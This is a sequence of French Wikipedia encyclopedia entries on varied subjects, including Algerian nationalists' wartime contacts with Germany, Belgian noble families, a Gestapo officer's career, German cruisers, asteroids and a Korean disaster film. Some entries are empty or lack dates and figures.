À la mi-1938, les Allemands avaient approché, à Malmedy en Belgique, un élément de la Fédération de France dans le but de sonder les intentions des nationalistes algériens en cas d'effondrement de la France. Il s'est ensuivi le déplacement en Allemagne, à l'insu de la direction centrale du PPA, de deux anciens responsables de l'Étoile nord-africaine, Mohand Rebbouh et Belkacem Radjef. Informé de ce déplacement, Messali, toujours emprisonné, tomba dans une rage folle et décida la dissolution de la Fédération d'Alger et l'exclusion de ses responsables du Parti.
Les exclus vont fonder le Comité d'action révolutionnaire nord-africain. Taleb Mohamed, Flitta Ahmed, Ouamara Mohamed dit Rachid, Hamza Omar, Mekideche Lakhdar, Messaoudi Amar, Henni Mohamed dit Daki, Lazli Ahmed et Kessi Cherif en sont les membres fondateurs.
Le CARNA était en rapport avec Aït Hidouche afin de coordonner ses activités avec les militants de France et c'était Ouamara qui, par ses fréquents déplacements entre Alger et Paris, qui entretenait le contact.
Le fait de se retrouver en "congé du Parti" n'avait en rien atténué leur ardeur de chauds partisans d'un rapprochement avec les Allemands.
Les activités du Comité.
Taleb a été la cheville ouvrière du CARNA dont les principaux animateurs furent Ouamara, Hamza, Flitta et Mekidèche.
En juillet 1939, 2 mois avant le début de la Seconde Guerre mondiale, le comité délègue quatre de ses membres; Taleb, Flitta, Hamza et Mekidèche; en Allemagne afin de relancer les contacts. Là, ils effectuèrent un court stage de formation théorique et pratique sur le thème de la guérilla et ses méthodes mais leurs attentes furent déçues. Le principe d'une aide pour l'Algérie était certes réaffirmé par leurs interlocuteurs mais de façon tellement évasive qu'elle lui ôtait tout crédit. 
Malgré sa déconvenue, le CARNA ne renoncera pas à ses velléités de brusquer le destin par Allemands interposés. Un rendez-vous est pris avec un agent allemand en octobre 1939 près du bastion de l'amirauté à Alger. Abdoun et Taleb s'y rendirent mais la personne qu'ils devaient rencontrer ne se manifesta pas.
Alors en position d'attente, le comité se recentre sur une activité de propagande autour du thème qu'une France occupée est davantage vulnérable.
Début octobre 1940, une nouvelle vague répressive s'abat sur les cadres du PPA et certains membres du CARNA sont arrêtés sous l'inculpation d'"individus suspects et dangereux pour la défense nationale". Flitta est incarcéré et Hamza est assigné à résidence à Djenan Bourezg dans le sud oranais.
À Alger, par la force des choses c'était paradoxalement le CARNA qui s'était quelque peu substitué sur le terrain au PPA dont il semblait incarner l'aile radicale. En effet la direction du parti était traquée et dans les faits le Comité assurait une sorte de doublure officieuse, prêtant parfois aide et assistance aux militants du part désemparés. Lorsque Messali, en mars 1941, comparaît avec 27 de ses compagnons en cour martiale, c'est Taleb qui était en relation avec son avocat maître Ahmed Boumendjel et qui répercutait les informations aux militants. 
Cependant la CARNA n'avait de cesse de regarder en direction des Allemands. Il décida de bouger et de sortir de l'expectative en prenant langue de lui-même avec les officiers nazis membres de la Commission mixte d'armistice. En , Taleb et Abdoun prennent rendez-vous avec un officier allemand au café "Palma" rue Colonna d'Ornano mais l'entretien reste sans suite; l'officier n'ayant aucune habilitation ou consigne pour discuter de quoi que ce soit avec les nationalistes locaux. Mais le Comité va s'obstiner.
En , il va charger Ouamara de se rendre à Paris afin de forcer sur place la main au haut commandement allemand. Il parvient à se faire introduire auprès d'un officier supérieur mandaté pour discuter avec lui. Et là, immense déception. Alors que le CARNA, par la voix d'Ouamara, envisageait un éventuel soutien logistique allemand dans le cadre d'une dynamique de libération fondée sur une option militaire à déterminer, les responsables nazis se plaçaient dans une perspective opposée. Pour eux, l'aide allemande pouvait se concevoir, mais pas dans un but d'émancipation politique de l'Algérie. Si les nationalistes tenaient tant à combattre la France, le Reich serait là pour leur offrir l'occasion de le faire mais à ses conditions et hors de toute liberté opérationnelle. 
Il leur était donc proposer de se mettre à la disposition des Allemands pour des missions rémunérées de renseignement ou de sabotage sous leur strict contrôle. Et rien de plus.
Donc échec consommé du CARNA dans sa recherche d'une adhésion allemande à leur projet.
Les "durs" du Comité vont alors se tourner vers les Italiens par l'intermédiaire d'une connaissance, Saïd dit Diavolo, travaillant au Consulat d'Italie à Alger. Taleb réussit, début 1942 à arracher un rendez-vous avec le Consul. L'entrevue se déroule au domicile de Sid Ahmed Pacha à Saint-Eugène (aujourd'hui Bologhine); y assistèrent, côté CARNA, Taleb, Abdoun et Ouamara. Le consul leur dévoila qu'il n'y avait aucune prévision d'aide aux Algériens à des fins émancipatrices mais qu'au contraire il était prévu la partition du pays; l'attribution de la Tunisie et de l'Est constantinois à l'Italie, le reste du constantinois à la France, l'algérois à l'Allemagne et l'oranie à l'Espagne. Il leur remit néanmoins une certaine somme d'argent dans une enveloppe fermée. Ce sera là les seuls subsides que le CARNA aura jamais reçus de ses interlocuteurs étrangers.
Après ces déconvenues, le CARNA avait peu à peu abandonné sa dénomination originelle pour une autre plus neutre et plus anonyme, celle d'"Organisation". Ses éléments ont continué à militer en fonction des orientations de fond du PPA sur le long terme; Messali qui avait compris que le Parti ne pouvait se passer d'eux longtemps, les absout, l'été 1942.
Les effets à long terme.
Dans la recherche d'une adhésion allemande à son projet, la CARNA a essuyé un échec patent. Messali avait vu juste. Charriant discrimination et exclusion, la théorie nazie considérait fondamentalement les colonisés comme des sous hommes voués à vivre éternellement sous tutelle de plus forts et indignes de se réclamer d'un quelconque droit à s'autogouverner.
Que faut-il retenir de ses tentatives avortées? Les membres du Comité, malgré leur erreur de jugement, les premiers, eurent l'intuition que l'agitation propagande ne serait qu'un semblant de lutte, un leurre s'il n'y avait pas derrière un plan concret de combat armé. Ils furent les promoteurs de ce que le PPA entreprendra 7 ans plus tard avec l'OS.

</doc>
<doc id="7279984" url="https://fr.wikipedia.org/wiki?curid=7279984" title="Pindad SPG-3">
Pindad SPG-3



</doc>
<doc id="7279988" url="https://fr.wikipedia.org/wiki?curid=7279988" title="Famille de Gerlache">
Famille de Gerlache

La famille de Gerlache est une famille de la noblesse belge dont l'ascendance prouvée remonte à 1622.
Historique.
Elle obtient concession de noblesse en 1751 par lettres de Marie-Thérèse confirmant un état noble antérieur de plus d'un siècle, puis concession du titre de baron.
Personnalités.
À cette famille appartiennent :

</doc>
<doc id="7279989" url="https://fr.wikipedia.org/wiki?curid=7279989" title="Elliot Safo">
Elliot Safo

Elliot Safo (né le ) est un athlète britannique, spécialiste du saut en longueur.
Biographie.
En battant son record personnel, il remporte le titre des Championnats d'Europe juniors 2013 à Rieti, après avoir terminé des Championnats du monde juniors de Barcelone en 2012 en . Auparavant, son record était de à Bedford.

</doc>
<doc id="7279990" url="https://fr.wikipedia.org/wiki?curid=7279990" title="Michel de Coma-Serra">
Michel de Coma-Serra

Michel de Coma-Serra, né à Perpignan (Roussillon, France) le et mort le , est un homme de loi et homme politique français.
Biographie.
Le , Coma-Serra est élu, au premier tour de scrutin, député de la noblesse aux États généraux de 1789 par la province de Roussillon.
Il siège à droite et montre peu de goût pour les idées nouvelles. De concert avec son collègue, l'autre député de la noblesse du Roussillon, Banyuls de Montferré, il proteste contre la réunion des trois ordres par la lettre suivante :
« Nous, députés de la noblesse des vigueries du Roussillon, Conflent et Cerdagne, soussignés, croyons qu'il est de notre devoir de dire que d'après la lettre de notre mandat qui nous assujettit à voter par ordre et nous ordonné cependant de rester unis à notre ordre en protestant, déclarons que nous nous priverons de toute voix délibérative en tout ce qui sera contraire à notre mandat jusqu'à ce que nos commettants, à qui nous avons déjà donné connaissance de l'état actuel des choses, auront pris en considération la déclaration du roi. En conséquence, en attendant des instructions ultérieures, nous protestons contre toute délibération qui pourrait être prise dans cette Assemblée et en demandons acte.
« Fait à Versailles, dans la Chambre de l'ordre de la noblesse, la mardi, .
« Signé : Comaserra, Banyuls de Montferré.
« Nota : Cette protestation n'est que provisoire ; il se présentera bientôt l'occasion d'en faire une autre plus étendue. »
Coma-Serra et Banyuls de Montferré se rallièrent pourtant à l'Assemblée nationale constituante. En 1790, à propos de la constitution civile du clergé, une ameute ayant été fomentée à Perpignan par la Société contre-révolutionnaire des Amis de la paix, Coma-Serra et Banyuls de Montferré se trouvèrent compromis dans les troubles. Les « patriotes » étaient allés les chercher à leur domicile et les avaient conduits au « département ». Ils furent d'ailleurs, par respect pour leur inviolabilité, laissés en liberté et « accompagnés avec calme chez eux par six administrateurs ». Le , Muguet rendit compte de cette affaire à la Constituante.
Arrêté le , Coma-Serra est conduit à Montpellier. Il ne doit son salut qu'au 9 thermidor.
Coma-Serra meurt en 1813. Il lègue à Banyuls de Montferré la jouissance de l'ancienne maison Serra, sise rue de Font-Froide.

</doc>
<doc id="7279992" url="https://fr.wikipedia.org/wiki?curid=7279992" title="Capricia">
Capricia

Le Capricia (A 5322) est un yawl italien à gréement marconi, servant de navire-école pour la formation des étudiants de l'Académie navale de Livourne.
Histoire.
Son premier propriétaire fut Einar Hansen de Malmö (Suède). En 1971 il est acquis par la fondation Agnelli qui le transforme au niveau des aménagements intérieurs.
En 1993 il est donné à la Marine italienne pour servir à la formation des aspirants de la Guardiamarina auprès des deux autres unités "Stella Polare" et "Orsa Maggiore".
C'est un bateau de régate de classe RORC. Il participe aux Tall Ships' Races en classe D.
Il fut présent au départ de la Mediterranean Tall Ships Regatta 2007 et à l'escale de Toulon Voiles de Légende 2007.

</doc>
<doc id="7280002" url="https://fr.wikipedia.org/wiki?curid=7280002" title="Pandémie (film, 2013)">
Pandémie (film, 2013)

Pandémie (Hangeul : , RR : "", littéralement « Grippe ») est un film catastrophe sud-coréen écrit et réalisé par Kim Seong-su, sorti en 2013.
Synopsis.
Une épidémie mortelle ravage Bundang, la banlieue de Seongnam à Séoul. Après l'arrivée dans cette ville d'un conteneur renfermant un groupe d'immigrants clandestins presque tous déjà morts, Byung-woo, le premier coréen qui a été en contact avec le seul migrant encore en vie, meurt d'un virus inconnu qui commence à infester des dizaines de résidents. C'est le chaos. Dans le pire des cas, le gouvernement ordonne d'isoler la banlieue en plein moment où In-hye et Ji-goo tentent de fuir vers la ville close…
Production.
Distribution des rôles.
Après Jo In-sung alors pressenti en fin , c'est l'acteur Jang Hyuk qui retrouve, en , le réalisateur dix ans après, pour le rôle d'un sauveteur héroïque. L'actrice Soo Ae a été choisie en . Lors d'une conférence de presse en au Sinsa-dong dans l'arrondissement du Gangnam-gu, cette dernière et la jeune Park Min-ha sont engagées à interpréter les rôles de mère-fille.
Tournage.
Le tournage a lieu entre mai et .
Promotion.
La première bande-annonce se dévoile au début de .
Accueil.
Sorties.
Le film sort le au Corée du Sud. En quatre jours, il accueille à la seconde place, laissant "Hide and Seek" (숨바꼭질) de Huh Jung à la première place avec également en quatre jours et "Le Transperceneige" (설국열차) de Bong Joon-ho, à la troisième place avec en vingt jours.
En France, Wild Side distribue les DVD à partir du sous le titre "Pandémie".

</doc>
<doc id="7280007" url="https://fr.wikipedia.org/wiki?curid=7280007" title="Astrid Suurbeck">
Astrid Suurbeck



</doc>
<doc id="7280013" url="https://fr.wikipedia.org/wiki?curid=7280013" title="Tuần Châu">
Tuần Châu

Tuần Châu est une île localisée sur la côte sud-ouest de la ville de Hạ Long, au Vietnam. Composée de micaschiste, et couverte de pins, l'île possède une superficie de 2,3 km² et deux plages couvertes de sable fin et blanc. L'île de Tuần Châu est devenue l'une des destinations touristiques les plus prisées de la ville de Hạ Long. L'île possède également des sites archéologiques de l'ancienne culture de Hạ Long datant de à ans.
Une route bétonnée de 2 kilomètres permet l'accès à Tuần Châu. La construction de cette route a officiellement démarré le . Des investissements ont été effectués pour rendre l'île plus moderne pour le tourisme. Les attractions incluent notamment des clubs, des parcours de golf, des centres sportifs, une plage et un marché rural. En 2004, Miss Vietnam s'est rendue sur cette île.

</doc>
<doc id="7280016" url="https://fr.wikipedia.org/wiki?curid=7280016" title="Dream Theater (album)">
Dream Theater (album)

 est le douzième album studio du groupe de metal progressif américain Dream Theater, sorti le via Roadrunner Records. C'est le deuxième album studio enregistré avec le batteur Mike Mangini, qui a remplacé Mike Portnoy en 2011, mais c'est la première fois que Mangini participe à la composition de l'album.
Le premier single, "The Enemy Inside", est sorti le .
Enregistrement.
L'album a été enregistré au Cove City Studio à Glen Cove près de Long Island.
Parution et promotion.
L'album se classe au Billboard 200 et s'est vendu à plus de à sa première semaine aux États-Unis. Lors de la tournée de promotion, le groupe donne un concert unique au Boston Opera House le , accompagné par l'orchestre et la chorale du Berklee College of Music. Leur performance est filmée par Pierre et François Lamoureux, conduisant à sa sortie en DVD/Blu-Ray le , intitulée "", produite par John Petrucci et mixée/matricée par Richard Chycki.

</doc>
<doc id="7280018" url="https://fr.wikipedia.org/wiki?curid=7280018" title="E. Richard Johnson">
E. Richard Johnson

Emil Richard Johnson, né le à Prentice dans le Wisconsin et mort le est un écrivain américain de roman policier.
Biographie.
Après avoir grandi dans le Wisconsin, Emil Richard Johnson quitte l’école à 17 ans et s’engage dans l’armée où il devient sous-officier. De 1956 à 1960, il est sergent des services de renseignements en Allemagne de l'Ouest.
Après sa démobilisation, il est successivement garde forestier, ouvrier agricole et foreur de puits. En 1964, il est condamné pour attaque à main armée et meurtre. C’est dans sa cellule de Stillwater qu’il commence à écrire.
Son premier roman "Silver Street" obtient en 1969 le prix Edgar-Allan-Poe du meilleur premier roman. C’est le début d’une série de cinq romans consacrés à Tony Lanto, inspecteur de police.
Emil Richard Johnson a écrit tous ses romans en prison, sa peine s’achevant en 1992, car sa libération conditionnelle fut annulée quand il est reconnu coupable du délit de consommation de drogues derrière les barreaux et quand il est à nouveau incarcéré après une brève évasion.

</doc>
<doc id="7280019" url="https://fr.wikipedia.org/wiki?curid=7280019" title="Élections sénatoriales japonaises de 2013">
Élections sénatoriales japonaises de 2013



</doc>
<doc id="7280022" url="https://fr.wikipedia.org/wiki?curid=7280022" title="Andre Santos">
Andre Santos



</doc>
<doc id="7280027" url="https://fr.wikipedia.org/wiki?curid=7280027" title="Camertés">
Camertés

Camertés ou Camertès ou Camerte ou Camers dans l'Énéide est le nom d'un jeune roi italique qui se bat aux côtés de Turnus contre Énée.
Histoire.
Fils de Volcens, un noble Rutule, Camertés devient roi d'Amyclae, une ville du Latium fondée par les Dioscures. Camertés est, selon Virgile, le plus riche des souverains italiques, et est également un très beau jeune homme : en particulier, il est connu pour ses cheveux blonds. Lorsque la guerre éclate entre Énée et Turnus, il soutient ce dernier étant évidemment Rutule de naissance. Même Volcens, quoique maintenant un vieillard, décide de revêtir l'armure.
Énée, exaspéré par la mort de Pallas, qui a été tué au combat par Turnus, fait un massacre d'ennemis. Il décapite Tarquitus, l'un des ennemis les plus braves ; après cela, l'armée italique prend la fuite, terrifiée. Camertés s'échappe avec les autres, mais il est tué par l'épée du chef troyen.
Plus tard Juturne, la nymphe sœur de Turnus, prendra l'apparence du fantôme de Camertès, pour conduire les Rutules à rompre la trêve passée entre les deux armées.

</doc>
<doc id="7280028" url="https://fr.wikipedia.org/wiki?curid=7280028" title="Classe Gazelle">
Classe Gazelle

La classe Gazelle est une classe de croiseurs légers de la "Kaiserliche Marine". Ses navires sont construits en deux sous-classes. Les navires conçus en 1895 sont les SMS "Gazelle", "Niobe", , "Thetis", , "Medusa" et "Amazone". Ceux conçus entre 1897 et 1900, un peu plus larges, sont les SMS "Frauenlob", "Arcona" et "Undine".
Histoire.
Les navires de cette classe sont les premiers croiseurs légers modernes de la "Kaiserliche Marine" et font partie du renouvellement de la flotte décidé en 1898. Ils n'ont pas de prédécesseurs mais s'inspirent de l'aviso de la ainsi que du . Cette classe en précède d'autres comme la classe Kolberg et la classe Magdeburg.
L'arsenal Germania à Kiel a construit trois navires, les SMS "Gazelle", "Nymphe" et "Amazone". Cinq croiseurs viennent de l'AG Weser à Brême, les SMS "Niobe", "Ariadne" et "Medusa" ainsi que "Frauenlob" et "Arcona". Le SMS "Thetis" est issu de Kaiserliche Werft Danzig et l"'Undine" de Howaldtswerke-Deutsche Werft.
Six croiseurs font d'abord une mission d'éclaireur : "Niobe" d' à , "Ariadne" de à , "Amazone" de à , "Frauenlob" de à , "Medusa" d' à , "Arcona" de à .
Trois servent de navires-écoles : "Nymphe" de à et de à , "Undine" de à , "Medusa" de à .
Quatre ont fait des missions à l'étranger : "Gazelle" de à , "Thetis" de à , "Niobe" de à et "Arcona" de à .
De 1904 à , les dix navires sont mis en réserve. Seul le SMS "Arcona", transformé en mouilleur de mines, est remis en service en et est actif lorsque la Première Guerre mondiale commence. Les "Ariadne", "Undine" et "Frauenlob" sont perdus durant le conflit.
Le SMS "Gazelle" est abandonné à la fin de la guerre, les six derniers navires intègrent la flotte de la "Reichsmarine". Le "Medusa" est en service de à , "Arcona" de à . Le SMS "Amazone" est en service jusqu'en . En , le "Thetis" revient puis est remplacé par le "Nymphe" en , qui reste en service jusqu'en .
Seul le SMS "Niobe" est un navire de la réserve de la "Reichsmarine". Il est vendu à la Yougoslavie qui en fait un navire-école. En , sous son nom allemand, il accueille un équipage germano-croate, mais il est perdu en .

</doc>
<doc id="7280030" url="https://fr.wikipedia.org/wiki?curid=7280030" title="Famille van Eyll">
Famille van Eyll

La famille van Eyll est une famille de la noblesse belge originaire de Grave (ancien duché de Brabant) dont l'ancienneté prouvée remonte à 1623.
Origine.
L'ancêtre le plus lointain de la famille van Eyll est Alard van Eyll qui était échevin de Grave ; il avait épousé Jeanne Verberchtz et décéda le .
Une anecdote concernant l'abbaye de Binderen (1244-1648), relate l'existence de deux membres de la famille van Eyll, deux sœurs répondant aux noms de Levina et Johanna van Eyll. La mort de la première est attestée en 1633. La seconde était abbesse de l'abbaye. Cette institution religieuse fondée par Marie de Brabant n'était destinée qu'à accueillir des femmes d'origine noble.

</doc>
<doc id="7280033" url="https://fr.wikipedia.org/wiki?curid=7280033" title="Films américains sortis en 1949">
Films américains sortis en 1949

Liste (non exhaustive) de films américains sortis en 1949.
"All the King's Men" remporte l'Oscar du meilleur film à la des Oscars organisée le 

</doc>
<doc id="7280043" url="https://fr.wikipedia.org/wiki?curid=7280043" title="Wedaustadion">
Wedaustadion

Le Wedaustadion était un stade de Duisbourg inauguré en 1921, d'une capacité de places. Lors de sa construction, c'était le second plus grand stade allemand.
Utilisé pour des épreuves d'athlétisme, il accueille aussi les matchs du MSV Duisbourg jusqu'en 2004 et l'Universiade d'été de 1989.

</doc>
<doc id="7280054" url="https://fr.wikipedia.org/wiki?curid=7280054" title="Sarah Rafferty">
Sarah Rafferty

Sarah Rafferty est une actrice américaine, née le à New Canaan (Connecticut). Elle est connue pour avoir incarné le rôle de Donna Paulsen dans la série télévisée "", de 2011 à 2019.
Biographie.
Enfance et études.
Sarah Rafferty grandit dans le quartier de Riverside de Greenwich, au Connecticut.
Sa mère est présidente du département d'anglais de l'école du Couvent du Sacré-Cœur, et son père, Michael Griffin Rafferty , a fait carrière en finance et dans la peinture.
Elle a trois sœurs aînées, Maura, Ann et Constance.
Elle étudie à la Phillips Academy, un lycée d'Andover (Massachusetts), et en sort diplômée en 1989. Elle commence des études supérieures en anglais et en théâtre au Hamilton College, pendant lesquelles elle passe un an pour étudier le théâtre au Royaume-Uni et à l'université d'Oxford. Après avoir été diplômée avec la mention "magna cum laude" à Hamilton en 1993, elle suit des cours à l'université Yale, jusqu'à obtenir un Master of Arts.
Vie privée.
Elle est mariée depuis 2001 à Aleksanteri Olli-Pekka Seppälä, analyste de recherche de titres dans l'unité de gestion d'actifs de Lazard Frères &amp; Company, à New York. Le couple se marie à l'église catholique romaine de Sainte-Marie à Greenwich, Connecticut. Ils ont deux filles, Oona Gray (née le ) et Iris Friday (née en ).
Sarah Rafferty est depuis longtemps une amie très proche de l'acteur Gabriel Macht, avec qui elle partage l'affiche de la série à succès ' entre 2011 et 2019. Ils se sont rencontrés au ' de 1993.
Le , elle est présente, comme une grande partie du casting de ", au mariage royal du Prince Harry et de Meghan Markle, collègue et amie de travail.
Carrière.
En 2011, elle se fait connaître du grand public grâce à son rôle de Donna Paulsen dans la série télévisée judiciaire " aux côtés de Gabriel Macht, Patrick J. Adams, Meghan Markle, Gina Torres et Rick Hoffman"," diffusée sur "USA Network" entre le et le .
En 2016, elle joue aux côtés de Sam Page dans le téléfilm "Un coach pour la Saint-Valentin" de Gary Harvey.
En 2020, elle joue dans le film américain "Browse" de Mike Testin aux côtés de Lukas Haas, Bodhi Elfman, Chloe Bridges, Jocelin Donahue et Allison Dunbar. La même année, elle est invitée dans la série télévisée médicale "Grey's Anatomy".
En 2021, elle rejoint le casting récurrent de la série télévisée médicale "Chicago Med" de Dick Wolf au cours de la saison 7, aux côtés de Nick Gehlfuss, Brian Tee, , Oliver Platt et Sharon Epatha Merkerson.

</doc>
<doc id="7280055" url="https://fr.wikipedia.org/wiki?curid=7280055" title="Erich Isselhorst">
Erich Isselhorst

Erich Isselhorst ( 1906-1948) est un juriste allemand, cadre du NSDAP. Standartenführer de la Waffen-SS, il fut chef de la Gestapo à Erfurt, Cologne, Klagenfurt et Munich.
Biographie.
Formation et carrière.
Fils d'un sergent du " Feldartillerie-Regiment", un régiment lorrain du Armee-Korps, Erich Heinrich Georg Isselhorst naît le , à Saint-Avold, ville animée d'Alsace-Lorraine. Trop jeune pour s’être battu pendant la Première Guerre mondiale, Isselhorst nourrit un sentiment de revanche à l'encontre de la France. Après son Abitur, passé en , Erich Isselhorst fait des études de droit à Munich et Cologne. Docteur en 1931, il devient "Rechtsreferendariat", Assistant de justice, auprès de la Cour de Düsseldorf. Il publie ses travaux en 1932. Il se marie le . Comme son compatriote Theodor Berkelmann, Isselhorst se tourne naturellement vers le NSDAP. En , il s'inscrit au parti, devenant conseiller juridique de la section locale de Düsseldorf-Friedrichstadt. En , il devient membre de la "Nationalsozialistischer Rechtswahrerbund", ou BNSDJ, l'association des juristes nazis. En , il rejoint les SA, puis la SS. Il intègre la Gestapo en à Berlin. Il poursuit sa carrière à Erfurt, Cologne, Klagenfurt et enfin Munich, gravissant rapidement les échelons hiérarchiques. Sous-lieutenant en 1935, premier lieutenant en 1936, il passe Sturmbannführer, commandant, en 1938. Chef de la Gestapo de Cologne lors de l'Anschluss, il est affecté provisoirement à Klagenfurt en Autriche, avant d'être muté à Munich en .
Seconde Guerre mondiale.
Chef de la Gestapo de Munich au début de la Seconde Guerre mondiale, Erich Isselhorst est promu Obersturmbannführer en 1941. En , après une sanction disciplinaire, il est affecté sur le front russe, pour prendre la direction des sections I et II de l'Einsatzgruppe B, à Smolensk. Du printemps 1942 à l'été 1943, il y commande les "Einsatzkommandos" 1 et 8, au sein de l' "Einsatzgruppe" A, stationné à Krasnogvardeïsk, près de Leningrad.
Isselhorst dirige ensuite la "Sicherheitspolizei" dans l'oblast de Minsk, commandant le Sonderkommando 1b de l'Einsatzgruppe A. De retour à l'ouest fin 1943, Erich Isselhorst est nommé "Befehlshaber", gouverneur, de la "Sicherheitspolizei" à Strasbourg. À ce poste, il est promu Standartenführer en 1944. Il ordonne notamment l'exécution systématique des résistants membres du réseau Alliance, ce qui donne lieu à l'exécution sommaire de 108 membres de ce réseau au camp de concentration du Struthoff, tués et incinérés dans la nuit du au 2 septembre, mais également à plusieurs autres exécutions collectives dans d'autres villes ou prisons allemandes. Il fait appliquer également les ordres d'exécution de Hitler, tel l'ordre Commando durant l'opération Waldfest, en faisant exécuter les membres du Special Air Service prisonniers après l'opération Loyton, ainsi que d'autres prisonniers, civils ou militaires.
La région ayant été libérée par les troupes alliées, Isselhorst est affecté dans un service de la "Reichssicherheitshauptamtes", l'Office central de la sécurité du Reich, à Berlin. Peu avant la fin de la guerre, en , Isselhorst prend la tête d'un Waffen-SS-Gruppe, près de Jachenau en Bavière. Le , Isselhorst est fait prisonnier à Sachenbach.
Après guerre.
Interné dans diverses prisons et centres de détention à Augsburg, Karlsruhe, Heidelberg, Frankfurt-Oberursel, Dachau et Stuttgart-Zuffenhausen, Isselhorst est transféré à Wuppertal en . Dans une note, qu'il écrit en 1947, Isselhorst affirme qu'il est devenu nazi, pour lutter contre la menace bolchevique. Jugé par les autorités militaires françaises pour crime de guerre, Erich Isselhorst est condamné à mort et fusillé à Strasbourg, le .

</doc>
<doc id="7280056" url="https://fr.wikipedia.org/wiki?curid=7280056" title="Juillet 1954">
Juillet 1954

Cette page présente les faits marquants du mois de .

</doc>
<doc id="7280060" url="https://fr.wikipedia.org/wiki?curid=7280060" title="Marcel Oms">
Marcel Oms

Marcel Oms, né le à Perpignan et mort accidentellement le , est un historien et critique de cinéma français.
Biographie.
Enseignant à Perpignan (professeur de philosophie au lycée du Clos-Banet), spécialiste du cinéma espagnol, Marcel Oms a collaboré à "Positif", "CinémAction", "Cinéma" et aux "Cahiers de la Cinémathèque", revue de critique historique du film qu'il a fondée en 1971.
Il a créé à Perpignan le ciné-club "Les Amis du cinéma" en 1962, le "Festival Confrontation" en 1965 et, en collaboration avec la cinémathèque de Toulouse, l'Institut Jean-Vigo et ses colloques.

</doc>
<doc id="7280064" url="https://fr.wikipedia.org/wiki?curid=7280064" title="Remo Gaspari">
Remo Gaspari

Remo Gaspari, né le à Gissi et mort le dans la même ville, est un avocat et homme politique italien, membre de la Démocratie chrétienne (DC).
Élu député de L'Aquila en 1953, il devient ministre pour la première fois en 1969 et le reste quatre ans. Il revient très brièvement au gouvernement en 1980, avec le portefeuille de la Défense, puis y un fait un long retour, de 1981 à 1992, année de son retrait de la vie politique. Il a notamment été trois fois ministre sans portefeuille, chargé de la Fonction publique.
Biographie.
Un jeune avocat en politique.
En 1946, Remo Gaspari obtient une laurea de droit à l'université de Bologne et commence à exercer la profession d'avocat à Gissi. Aux élections générales des 7 et , il est élu à la Chambre des députés dans la circonscription de L'Aquila.
Enchaînement de sous-secrétariats d'État.
Après les élections générales de 1958, il devient secrétaire de la commission des Affaires intérieures de la Chambre. Deux ans plus tard, le , il est nommé sous-secrétaire d'État au ministère des Postes et Télécommunications, fonction qu'il occupe jusqu'au , lorsqu'il passe au ministère de l'Industrie et du Commerce.
Il retourne au ministère des Postes le , à la suite des élections générales. Il le quitte à nouveau le , pour devenir sous-secrétaire d'État du ministère de l'Intérieur.
Ministres à de très nombreuses reprises.
Débuts ministériels.
Quand Mariano Rumor forme son deuxième gouvernement, le , Gaspari accède au niveau ministériel, en tant que ministre des Transports et de l'Aviation civile. Dès le , il est muté en tant que ministre sans portefeuille, chargé de la Réforme de l'administration publique. Devenu ministre de la Santé le dans le deuxième gouvernement de Giulio Andreotti, il est débarqué de l'exécutif le .
Longue absence et bref retour.
Après sept années passées sur les bancs de la Chambre, il fait son retour au gouvernement lors de la formation du second cabinet de Francesco Cossiga, étant nommé ministre sans portefeuille, chargé des Relations avec le Parlement entre le 4 avril et le .
Onze ans de présence au gouvernement.
De nouveau exclu, il redevient ministre des Postes et Télécommunications avec le premier gouvernement du républicain Giovanni Spadolini, le . 
Lorsque le socialiste Bettino Craxi prend la direction du pays, il le nomme ministre sans portefeuille, chargé de la Fonction publique, le , dans son premier exécutif. Craxi contraint à la démission, Amintore Fanfani le remplace et désigne Gaspari ministre de la Défense le . Le 29 juillet suivant, il devient ministre sans portefeuille, chargé de la Protection civile, dans le gouvernement de Giovanni Goria le , puis chargé des Interventions extraordinaires dans le Mezzogiorno le dans le cabinet de Ciriaco De Mita, et enfin de la Fonction publique le , siégeant au sein du gouvernement Andreotti VI.
Fin de carrière.
Après quarante et un années de présence ininterrompue à la Chambre des députés, il ne se représente pas aux élections générales de 1994, qui marque le début de la fin du régime politique d'après-guerre, et se retire alors de la vie politique.

</doc>
<doc id="7280069" url="https://fr.wikipedia.org/wiki?curid=7280069" title="Stade municipal de Nyíregyháza">
Stade municipal de Nyíregyháza

Le stade municipal de Nyíregyháza en Hongrie est un stade de football et d'athlétisme, inauguré en 1958. En hongrois son nom est le Városi Stadion, qui signifie littéralement Stade de la ville. Sa capacité est de places assises.
C'est le stade du Nyíregyháza Spartacus Football Club.

</doc>
<doc id="7280074" url="https://fr.wikipedia.org/wiki?curid=7280074" title="Films américains sortis en 2012">
Films américains sortis en 2012

Liste (non exhaustive) de films américains sortis en 2012.

</doc>
<doc id="7280079" url="https://fr.wikipedia.org/wiki?curid=7280079" title="Városi Stadion">
Városi Stadion



</doc>
<doc id="7280082" url="https://fr.wikipedia.org/wiki?curid=7280082" title="(1189) Terentia">
(1189) Terentia

(1189) Terentia est un astéroïde de la ceinture principale découvert le par l'astronome russe Grigori Neujmin.
Historique.
Le lieu de découverte, par l'astronome russe Grigori Neujmin, est Simeis (094).
Sa désignation provisoire, lors de sa découverte le , était 1930 SG.
Caractéristiques.
Sa distance minimale d'intersection de l'orbite terrestre est de .

</doc>
<doc id="7280084" url="https://fr.wikipedia.org/wiki?curid=7280084" title="(1190) Pélagie">
(1190) Pélagie

(1190) Pélagie (désignation internationale "(1190) Pelagia") est un astéroïde de la ceinture principale découvert le par l'astronome russe Grigori Néouïmine.
Nom.
L'astéroïde est nommé d'après l'astronome russe Pelagueïa Shajn, dont le prénom correspond en français à .
Historique.
L'astéroïde a été découvert par l'astronome russe Grigori Néouïmine le à Simeis (094). Sa désignation provisoire était alors 1930 SL.
Caractéristiques.
Sa distance minimale d'intersection de l'orbite terrestre est de .

</doc>
<doc id="7280085" url="https://fr.wikipedia.org/wiki?curid=7280085" title="Hôtel de Colomby">
Hôtel de Colomby

LHôtel de Colomby est un hôtel particulier situé à Caen construit au . Il est inscrit depuis le .
Histoire.
L'hôtel est construit sous le règne de Louis XIII.
Architecture.
L'hôtel possède une tourelle carrée en encorbellement.

</doc>
<doc id="7280086" url="https://fr.wikipedia.org/wiki?curid=7280086" title="Juin 1954">
Juin 1954



</doc>
<doc id="7280096" url="https://fr.wikipedia.org/wiki?curid=7280096" title="Nadie se conoce">
Nadie se conoce

L'eau-forte Nadie se conoce (en français "Personne ne se connaît") est une gravure de la série "Los caprichos" du peintre espagnol Francisco de Goya. Elle porte le numéro six dans la série des 80 gravures. Elle a été publiée en 1799.
Interprétations de la gravure.
